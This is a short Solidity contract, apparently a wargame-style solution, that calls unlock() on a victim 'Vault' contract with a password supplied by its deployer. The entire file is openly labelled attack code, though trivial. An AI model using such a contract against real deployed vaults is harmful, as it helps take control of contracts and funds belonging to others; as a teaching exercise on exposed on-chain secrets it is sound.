// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface VaultInterface {
    function unlock(bytes32) external;
}

contract VaultAttack {
    address public attacker;

    modifier onlyAttacker {
        require(attacker == msg.sender, "VaultAttack: NOT_OWNER");
        _;
    }

    constructor() {
        attacker = msg.sender;
    }

    function attack(address _victim, bytes32 _password) external onlyAttacker {
        VaultInterface vaultInstance = VaultInterface(_victim);
        vaultInstance.unlock(_password);
    }
}
